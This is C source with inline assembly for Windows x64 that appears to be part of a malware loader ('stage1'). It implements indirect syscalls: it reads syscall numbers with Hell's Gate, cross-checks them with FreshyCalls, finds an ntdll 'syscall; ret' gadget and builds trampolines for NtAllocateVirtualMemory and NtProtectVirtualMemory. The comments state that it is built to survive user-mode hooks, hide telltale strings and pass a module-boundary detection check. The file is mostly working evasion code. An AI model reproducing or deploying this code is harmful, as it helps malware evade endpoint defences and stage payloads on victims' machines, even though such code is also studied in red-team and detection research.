/*
 * Hell's Hall -- indirect syscall resolver + trampolines (S34).
 *
 * Split into three layers (see syscalls.h for rationale):
 *
 *   Layer 1 -- Hell's Gate read. Read the first 4 bytes of an ntdll Nt*
 *     stub; if they match the canonical prologue (`4C 8B D1 B8`), the SSN
 *     is at bytes[4..6] little-endian. Returns 0xffffffffu if the prologue
 *     does not match (stub hooked, corrupted, or extended form).
 *
 *   Layer 2 -- FreshyCalls sort-index (RecycledGate cross-validation).
 *     Walk the ntdll EAT, count how many Nt* exports have a lower RVA than
 *     the target. That count IS the target's SSN, because ntdll's Nt*
 *     exports are sorted by RVA in SSN order. Never reads stub bytes, so
 *     it survives full-prefix hooking. Used both as a fallback for when
 *     Hell's Gate fails, and as a cross-check when Hell's Gate succeeds.
 *
 *   Layer 3 -- gadget scan. Linear scan of ntdll's executable sections for
 *     `0F 05 C3` (syscall; ret). Cached globally; one scan per process.
 *
 * After init, two naked asm trampolines (file-scope __asm__ blocks at the
 * bottom of this file) expose hh_NtAllocateVirtualMemory and
 * hh_NtProtectVirtualMemory with standard Win64 ABI signatures. Each
 * trampoline loads its SSN into EAX, moves rcx to r10 per the x64 syscall
 * ABI (syscall itself clobbers rcx), and jmps to the cached ntdll gadget.
 * The gadget executes `syscall; ret`, with the `ret` popping the caller's
 * return address left by the original `call` -- so control returns to the
 * C caller normally. RIP at kernel entry is inside ntdll, not stage1.
 *
 * Windows x86_64 only.
 */

#ifdef _WIN32

#include "syscalls.h"
#include "peb_walk.h"
#include "hash.h"

#include <windows.h>

#define SSN_INVALID 0xffffffffu

uint32_t g_ssn_nt_alloc   = SSN_INVALID;
uint32_t g_ssn_nt_protect = SSN_INVALID;
void    *g_syscall_gadget = 0;

/*
 * Hell's Gate: verify prologue + read bytes[4..6] as little-endian u16 SSN.
 * Return SSN_INVALID if the stub is hooked or has an unexpected layout.
 */
static uint32_t hellsgate_read(const uint8_t *stub) {
    if (!stub) return SSN_INVALID;
    if (stub[0] == 0x4c && stub[1] == 0x8b &&
        stub[2] == 0xd1 && stub[3] == 0xb8) {
        return (uint32_t)stub[4] | ((uint32_t)stub[5] << 8);
    }
    return SSN_INVALID;
}

/*
 * FreshyCalls sort-index: the SSN of an Nt* function equals the number of
 * other Nt*-prefixed exports in ntdll that have a strictly lower RVA. One
 * pass over the EAT, no allocations.
 *
 * @param base    ntdll base pointer
 * @param exp     pointer to its IMAGE_EXPORT_DIRECTORY
 * @param target  absolute address of the target stub
 */
static uint32_t freshy_ssn(uint8_t *base,
                           IMAGE_EXPORT_DIRECTORY *exp,
                           uint8_t *target) {
    uint32_t target_rva = (uint32_t)(target - base);
    uint32_t *names = (uint32_t *)(base + exp->AddressOfNames);
    uint16_t *ords  = (uint16_t *)(base + exp->AddressOfNameOrdinals);
    uint32_t *funcs = (uint32_t *)(base + exp->AddressOfFunctions);

    uint32_t count = 0;
    for (uint32_t i = 0; i < exp->NumberOfNames; i++) {
        const char *name = (const char *)(base + names[i]);
        /* Nt-prefix filter. Single-byte char compares: no plaintext
         * "Nt"/"Zw" string in stage1's .rodata. */
        if (name[0] != 'N' || name[1] != 't') continue;
        uint32_t rva = funcs[ords[i]];
        if (rva < target_rva) count++;
    }
    return count;
}

/*
 * Scan every executable section of ntdll for the first `0F 05 C3` gadget.
 * The full-section scan (vs scanning near one Nt* stub) handles 24H2's
 * extended-stub form where the gadget is not always at a fixed offset
 * inside any given stub.
 */
static void *find_syscall_gadget(uint8_t *base, IMAGE_NT_HEADERS64 *nt) {
    IMAGE_SECTION_HEADER *sec = IMAGE_FIRST_SECTION(nt);
    for (unsigned i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if ((sec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) == 0) continue;
        uint8_t *p = base + sec[i].VirtualAddress;
        uint32_t size = sec[i].Misc.VirtualSize;
        if (size < 3) continue;
        for (uint32_t j = 0; j <= size - 3; j++) {
            if (p[j] == 0x0f && p[j + 1] == 0x05 && p[j + 2] == 0xc3) {
                return p + j;
            }
        }
    }
    return 0;
}

int syscalls_init(void) {
    uint8_t *ntdll = (uint8_t *)peb_find_module(H_NTDLL_DLL);
    if (!ntdll) return 1;

    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)ntdll;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return 1;
    IMAGE_NT_HEADERS64 *nt =
        (IMAGE_NT_HEADERS64 *)(ntdll + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return 1;

    IMAGE_DATA_DIRECTORY *exp_dir =
        &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (exp_dir->VirtualAddress == 0) return 1;
    IMAGE_EXPORT_DIRECTORY *exp =
        (IMAGE_EXPORT_DIRECTORY *)(ntdll + exp_dir->VirtualAddress);

    uint8_t *p_alloc   = (uint8_t *)peb_find_export(ntdll, H_NT_ALLOC_VM);
    if (!p_alloc)   return 2;
    uint8_t *p_protect = (uint8_t *)peb_find_export(ntdll, H_NT_PROTECT_VM);
    if (!p_protect) return 3;

    uint32_t hg_a = hellsgate_read(p_alloc);
    uint32_t hg_p = hellsgate_read(p_protect);
    uint32_t fc_a = freshy_ssn(ntdll, exp, p_alloc);
    uint32_t fc_p = freshy_ssn(ntdll, exp, p_protect);

    /* Cross-validate: when Hell's Gate produced a value, it must agree
     * with FreshyCalls. Disagreement means either (a) a hook that left
     * the prologue pattern intact but swapped the SSN, or (b) a genuine
     * reshuffle we cannot trust -- fail closed. */
    if (hg_a != SSN_INVALID && hg_a != fc_a) return 4;
    if (hg_p != SSN_INVALID && hg_p != fc_p) return 4;

    g_ssn_nt_alloc   = (hg_a != SSN_INVALID) ? hg_a : fc_a;
    g_ssn_nt_protect = (hg_p != SSN_INVALID) ? hg_p : fc_p;

    g_syscall_gadget = find_syscall_gadget(ntdll, nt);
    if (!g_syscall_gadget) return 5;

    return 0;
}

/*
 * Naked asm trampolines. Each loads the cached SSN into EAX, performs the
 * x64 syscall ABI's `mov r10, rcx` (syscall clobbers rcx), and jmps to the
 * cached ntdll `syscall; ret` gadget. The gadget's `ret` pops the caller's
 * original return address -- control returns to C caller with NTSTATUS in
 * RAX. RIP at kernel entry is inside ntdll, satisfying the module-boundary
 * detection check.
 *
 * Use jmpq (not callq) -- we do not want to push our own return address; we
 * want the gadget's `ret` to unwind directly to the C caller.
 */
__asm__(
    ".text\n"
    ".globl hh_NtAllocateVirtualMemory\n"
    "hh_NtAllocateVirtualMemory:\n"
    "    movq %rcx, %r10\n"
    "    movl g_ssn_nt_alloc(%rip), %eax\n"
    "    jmpq *g_syscall_gadget(%rip)\n"
    "\n"
    ".globl hh_NtProtectVirtualMemory\n"
    "hh_NtProtectVirtualMemory:\n"
    "    movq %rcx, %r10\n"
    "    movl g_ssn_nt_protect(%rip), %eax\n"
    "    jmpq *g_syscall_gadget(%rip)\n"
);

#endif /* _WIN32 */
